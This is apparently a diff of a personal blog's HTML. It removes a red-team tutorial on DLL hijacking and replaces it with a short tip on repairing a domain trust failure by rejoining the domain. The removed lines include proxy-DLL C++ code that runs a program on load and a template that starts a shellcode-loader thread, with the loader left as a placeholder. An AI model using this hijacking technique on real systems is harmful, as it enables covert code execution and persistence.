@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="DLL hijacking from hijacking to on-line, Yangsir">
+    <meta name="keywords" content="A solution to the failure of the trust relationship between this workstation and the primary domain, Yangsir">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>DLL hijacking from hijacking to on-line | Yangsir</title>
+    <title>A solution to the failure of the trust relationship between this workstation and the primary domain | Yangsir</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/1.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801231855683.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">DLL hijacking from hijacking to on-line</h1>
+                    <h1 class="description center-align post-title">A solution to the failure of the trust relationship between this workstation and the primary domain</h1>
                 </div>
             </div>
         </div>
@@ -432,12 +432,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Redteam/">
-                                <span class="chip bg-color">Redteam</span>
+                            <a href="/tags/Domain-environment/">
+                                <span class="chip bg-color">Domain environment</span>
                             </a>
                         
-                            <a href="/tags/Bypass/">
-                                <span class="chip bg-color">Bypass</span>
+                            <a href="/tags/Operations/">
+                                <span class="chip bg-color">Operations</span>
                             </a>
                         
                     </div>
@@ -448,8 +448,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Learning-record/" class="post-category">
-                                Learning record
+                            <a href="/categories/Tips/" class="post-category">
+                                Tips
                             </a>
                         
                     </div>
@@ -461,28 +461,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-07-19
+                    2021-08-01
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-07-21
+                    2021-08-01
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    635
+                    58
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    3 Min
+                    1 Min
                 </div>
                 
 
@@ -505,149 +505,18 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">用中文写下理论知识，避免翻译的会看不懂了
+                <h2 id="The-cause"><a href="#The-cause" class="headerlink" title="The cause"></a>The cause</h2><pre class="line-numbers language-none"><code class="language-none">The domain controller is faulty and is redeployed. The domain machine is found to have the following problems, It cannot be used normally<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-DLL（Dynamic Link Library），全称动态链接库，是Windows系统上程序正常运行必不可少的功能模块，是实现代码重用的具体形式。简单的说，可以把DLL理解成帮助程序完成各种功能的组件。
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801231855683.png"></p>
+<h2 id="The-solution"><a href="#The-solution" class="headerlink" title="The solution"></a>The solution</h2><pre class="line-numbers language-none"><code class="language-none">The local administrator logs in to the faulty machine, adds it to a group, and restarts it<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-DLL劫持，通过一些手段来劫持或者替换正常的DLL，从而加载编译好的恶意DLL
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801231947795.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">Restart and then join the domain again<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-漏洞成因，调用loadlibrary可使用DLL的相对路径，这是系统会按照特定的顺序搜索一些目录，便于确认DLL的路径，根据官方文档的定义，在使用相对路径调用loadlibrary时，系统会依次从下方6个路径去寻找所需要的DLL
-	程序所在目录	
-	加载 DLL 时所在的当前目录
-	系统目录即SYSTEM32目录
-	16位系统目录即SYSTEM目录
-	Windows目录
-	PATH环境变量中列出的目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801232006784.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">After the system restarts, it can be used normally<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="Easy-Study"><a href="#Easy-Study" class="headerlink" title="Easy Study"></a>Easy Study</h2><pre class="line-numbers language-none"><code class="language-none">A lot of basic grammar is required here, so I won&#39;t go into detail here
-
-Here use forward to implementation
-
-Program A calls the function in AAA.dll, now change the AAA.dll to AAA_o.dll, then write A new AAA.dll and forward the original function to AAA_o.dll
-
-
-The DLL is as follows. You need to write an EXE to call the DLL and its functions
-
-aaa.dll
-
-extern &quot;C&quot; __declspec(dllexport) void test();
-
-BOOL APIENTRY DllMain(HMODULE hModule,
-	DWORD ul_reason_for_call,
-	LPVOID lpReserved)
-
-&#123;
-	switch (ul_reason_for_call)
-	&#123;
-	case DLL_PROCESS_ATTACH:
-	case DLL_THREAD_ATTACH:
-	case DLL_THREAD_DETACH:
-	case DLL_PROCESS_DETACH:
-		break;
-	&#125;
-	return TRUE;
-&#125;
-
-void test() &#123;
-	MessageBox(NULL, L&quot;aaa.dll success&quot;, L&quot;s&quot;, 0); 
-&#125;
-
-the successful call has the following effect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/1.png" alt="1"></p>
-<pre class="line-numbers language-none"><code class="language-none">Take a look at the export function and confirm the test export function<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/2.png" alt="2"></p>
-<pre class="line-numbers language-none"><code class="language-none">new dll
-
-extern &quot;C&quot; __declspec(dllexport) void test();
-
-BOOL APIENTRY DllMain(HMODULE hModule,
-	DWORD ul_reason_for_call,
-	LPVOID lpReserved)
-
-&#123;
-	switch (ul_reason_for_call)
-	&#123;
-	case DLL_PROCESS_ATTACH:
-		WinExec(&quot;calc.exe&quot;, SW_HIDE); 
-	case DLL_THREAD_ATTACH:
-	case DLL_THREAD_DETACH:
-	case DLL_PROCESS_DETACH:
-		break;
-	&#125;
-	return TRUE;
-&#125;
-
-void test() &#123;
-	MessageBox(NULL, L&quot;SUCCESS&quot;, L&quot;SSSSS&quot;, 0); 
-	HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;aaa_o.dll&quot;);
-	if (hDllInst) &#123;
-		typedef DWORD(WINAPI *EXPFUNC)();
-		EXPFUNC exportFunc &#x3D; NULL;
-		exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);
-		if (exportFunc) &#123;
-			exportFunc();
-		&#125;
-		FreeLibrary(hDllInst);
-	&#125;
-	return;
-&#125;
-
-The effect after hijacking is as follows
-
-A different way to use precompilation is much faster
-#pragma comment(linker, &quot;&#x2F;EXPORT:&lt;Function name&gt;&#x3D;&lt;Dll name&gt;.&lt;Function name&gt;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/3.png" alt="3"></p>
-<h2 id="How-to-Online"><a href="#How-to-Online" class="headerlink" title="How to Online"></a>How to Online</h2><pre class="line-numbers language-none"><code class="language-none">extern &quot;C&quot; __declspec(dllexport) void test();
-
-DWORD WINAPI DoSC(LPVOID lpParameter)
-&#123;
-	Like you SC loader
-&#125;
-
-
-BOOL APIENTRY DllMain(HMODULE hModule,
-	DWORD  ul_reason_for_call,
-	LPVOID lpReserved
-)
-&#123;
-	switch (ul_reason_for_call)
-	&#123;
-	case DLL_PROCESS_ATTACH:
-		HANDLE threadHandle;
-		threadHandle &#x3D; CreateThread(NULL, 0, DoSC, NULL, 0, NULL);
-		break;
-	case DLL_THREAD_ATTACH:
-	case DLL_THREAD_DETACH:
-	case DLL_PROCESS_DETACH:
-		break;
-	&#125;
-	return TRUE;
-&#125;
-
-void test()
-&#123;
-	MessageBox(NULL, L&quot;XXX&quot;, L&quot;YYY&quot;, 0);
-	HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;aaa.dll&quot;);
-	if (hDllInst)
-	&#123;
-		typedef DWORD(WINAPI *EXPFUNC)();
-		EXPFUNC exportFunc &#x3D; NULL;
-		exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);
-		if (exportFunc)
-		&#123;
-			exportFunc();
-		&#125;
-		FreeLibrary(hDllInst);
-	&#125;
-	return;
-&#125;
-
-You can do this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/4.png" alt="4"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801232023351.png"></p>
 
                 
             </div>
@@ -674,7 +543,7 @@ You can do this<span aria-hidden="true" class="line-numbers-rows"><span></span><
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yangsirrr.github.io/2021/07/19/dll-hijacking-from-hijacking-to-on-line/">https://yangsirrr.github.io/2021/07/19/dll-hijacking-from-hijacking-to-on-line/</a>
+                    <a href="https://yangsirrr.github.io/2021/08/01/a-solution-to-the-failure-of-the-trust-relationship-between-this-workstation-and-the-primary-domain/">https://yangsirrr.github.io/2021/08/01/a-solution-to-the-failure-of-the-trust-relationship-between-this-workstation-and-the-primary-domain/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -712,12 +581,12 @@ You can do this<span aria-hidden="true" class="line-numbers-rows"><span></span><
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Redteam/">
-                                    <span class="chip bg-color">Redteam</span>
+                                <a href="/tags/Domain-environment/">
+                                    <span class="chip bg-color">Domain environment</span>
                                 </a>
                             
-                                <a href="/tags/Bypass/">
-                                    <span class="chip bg-color">Bypass</span>
+                                <a href="/tags/Operations/">
+                                    <span class="chip bg-color">Operations</span>
                                 </a>
                             
                         </div>
@@ -763,16 +632,17 @@ You can do this<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2021/07/20/dll-hijacking-the-whitelist-application-online/">
+                <a href="/2021/08/01/a-solution-to-the-failure-of-the-trust-relationship-between-this-workstation-and-the-primary-domain/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20the%20whitelist%20application%20online/image.png" class="responsive-img" alt="DLL hijacking the whitelist application online">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801231855683.png" class="responsive-img" alt="A solution to the failure of the trust relationship between this workstation and the primary domain">
                         
-                        <span class="card-title">DLL hijacking the whitelist application online</span>
+                        <span class="card-title">A solution to the failure of the trust relationship between this workstation and the primary domain</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -782,9 +652,62 @@ You can do this<span aria-hidden="true" class="line-numbers-rows"><span></span><
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-20
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Tips/" class="post-category">
+                                    Tips
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Domain-environment/">
+                        <span class="chip bg-color">Domain environment</span>
+                    </a>
+                    
+                    <a href="/tags/Operations/">
+                        <span class="chip bg-color">Operations</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/07/31/powershell-bypass-catch-password/">
+                    <div class="card-image">
+                        
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/6.png" class="responsive-img" alt="Powershell bypass catch password">
+                        
+                        <span class="card-title">Powershell bypass catch password</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-31
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -808,43 +731,14 @@ You can do this<span aria-hidden="true" class="line-numbers-rows"><span></span><
                         <span class="chip bg-color">Bypass</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/03/23/zui-jin-tai-mang-liao-deng-guo-liang-tian-you-kong-liao-kai-shi-geng-xin/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="最近太忙了，等过两天有空了开始更新！">
-                        
-                        <span class="card-title">最近太忙了，等过两天有空了开始更新！</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-23
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Yangsir
-                            
-                        </span>
-                    </div>
+                    <a href="/tags/Mimikatz/">
+                        <span class="chip bg-color">Mimikatz</span>
+                    </a>
+                    
+                    <a href="/tags/Catch-Password/">
+                        <span class="chip bg-color">Catch Password</span>
+                    </a>
+                    
                 </div>
                 
             </div>
